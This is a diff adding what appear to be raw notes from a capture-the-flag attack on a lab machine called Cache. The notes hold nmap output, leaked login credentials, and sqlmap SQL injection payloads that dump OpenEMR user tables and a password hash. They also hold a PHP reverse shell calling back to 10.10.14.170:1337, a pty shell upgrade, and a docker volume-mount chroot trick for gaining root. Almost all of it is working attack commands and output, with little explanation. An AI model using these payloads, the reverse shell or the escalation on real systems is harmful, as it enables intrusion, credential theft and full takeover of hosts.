@@ -1,0 +1,184 @@
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-06 19:06 EDT
+Nmap scan report for 10.10.10.188
+Host is up (0.066s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
+|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
+|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Cache
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 41.09 seconds
+
+$(function(){
+    
+    var error_correctPassword = false;
+    var error_username = false;
+    
+    function checkCorrectPassword(){
+        var Password = $("#password").val();
+        if(Password != 'H@v3_fun'){
+            alert("Password didn't Match");
+            error_correctPassword = true;
+        }
+    }
+    function checkCorrectUsername(){
+        var Username = $("#username").val();
+        if(Username != "ash"){
+            alert("Username didn't Match");
+            error_username = true;
+        }
+    }
+    $("#loginform").submit(function(event) {
+        /* Act on the event */
+        error_correctPassword = false;
+         checkCorrectPassword();
+         error_username = false;
+         checkCorrectUsername();
+
+
+        if(error_correctPassword == false && error_username ==false){
+            return true;
+        }
+        else{
+            return false;
+        }
+    });
+    
+});
+
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:19:18 /2020-06-06/
+
+[22:19:18] [INFO] parsing HTTP request from '../../Downloads/req.txt'
+[22:19:18] [INFO] resuming back-end DBMS 'mysql' 
+[22:19:18] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: catid (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: catid=1' RLIKE (SELECT (CASE WHEN (5742=5742) THEN 1 ELSE 0x28 END))-- tjgT
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: catid=1' AND (SELECT 8024 FROM(SELECT COUNT(*),CONCAT(0x717a6a6b71,(SELECT (ELT(8024=8024,1))),0x7170707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- RDTr
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: catid=1' AND (SELECT 8409 FROM (SELECT(SLEEP(5)))vqoi)-- DSiY
+---
+[22:19:19] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0
+[22:19:19] [INFO] fetching entries of column(s) 'password, salt, username' for table 'users_secure' in database 'openemr'
+[22:19:19] [INFO] used SQL query returns 1 entry
+[22:19:19] [INFO] resumed: '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.'
+[22:19:19] [INFO] resumed: '$2a$05$l2sTLIG6GTBeyBf7TAKL6A$'
+[22:19:19] [INFO] resumed: 'openemr_admin'
+Database: openemr
+Table: users_secure
+[1 entry]
++---------------+--------------------------------------------------------------+--------------------------------+
+| username      | password                                                     | salt                           |
++---------------+--------------------------------------------------------------+--------------------------------+
+| openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ |
++---------------+--------------------------------------------------------------+--------------------------------+
+
+[22:19:19] [INFO] table 'openemr.users_secure' dumped to CSV file '/home/kali/.sqlmap/output/hms.htb/dump/openemr/users_secure.csv'
+[22:19:19] [INFO] fetched data logged to text files under '/home/kali/.sqlmap/output/hms.htb'
+[22:19:19] [WARNING] you haven't updated sqlmap for more than 157 days!!!
+
+[*] ending @ 22:19:19 /2020-06-06/
+
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.4#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:42:22 /2020-06-06/
+
+[22:42:22] [INFO] parsing HTTP request from '/home/kali/Downloads/req.txt'
+[22:42:22] [INFO] resuming back-end DBMS 'mysql' 
+[22:42:22] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: catid (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: catid=1' RLIKE (SELECT (CASE WHEN (5742=5742) THEN 1 ELSE 0x28 END))-- tjgT
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: catid=1' AND (SELECT 8024 FROM(SELECT COUNT(*),CONCAT(0x717a6a6b71,(SELECT (ELT(8024=8024,1))),0x7170707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- RDTr
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: catid=1' AND (SELECT 8409 FROM (SELECT(SLEEP(5)))vqoi)-- DSiY
+---
+[22:42:22] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0
+[22:42:22] [INFO] fetching entries of column(s) 'password, username' for table 'users' in database 'openemr'
+[22:42:22] [INFO] used SQL query returns 3 entries
+[22:42:22] [INFO] resumed: 'NoLogin'
+[22:42:22] [INFO] resumed: 'phimail-service'
+[22:42:22] [INFO] resumed: 'NoLogin'
+[22:42:22] [INFO] resumed: 'portal-user'
+[22:42:22] [INFO] resumed: 'NoLongerUsed'
+[22:42:22] [INFO] resumed: 'openemr_admin'
+Database: openemr
+Table: users
+[3 entries]
++--------------+-----------------+
+| password     | username        |
++--------------+-----------------+
+| NoLogin      | phimail-service |
+| NoLogin      | portal-user     |
+| NoLongerUsed | openemr_admin   |
++--------------+-----------------+
+
+[22:42:22] [INFO] table 'openemr.users' dumped to CSV file '/home/kali/.sqlmap/output/hms.htb/dump/openemr/users.csv'
+[22:42:22] [INFO] fetched data logged to text files under '/home/kali/.sqlmap/output/hms.htb'
+[22:42:22] [WARNING] you haven't updated sqlmap for more than 157 days!!!
+
+[*] ending @ 22:42:22 /2020-06-06/
+openemr_admin:xxxxxx
+
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.170/1337 0>&1'");
+?>
+
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
+python3 /tmp/asdf.py
+
+ash
+H@v3_fun
+
+luffy
+0n3_p1ec3
+
+nothing afhj556uo
+
+docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+run docker image ubuntu
+-v will mount a LOCAL DIR onto a DOCKER DIR (LOCALDIR:DOCKERDIR)
+chroot changes the apparent root directory for the current so chroot /DIR/THAT/IS/NEW/ROOT
+
+so mount local home onto docker /mnt and make /mnt the new root on the docker image
+--rm -it are just for cleanup
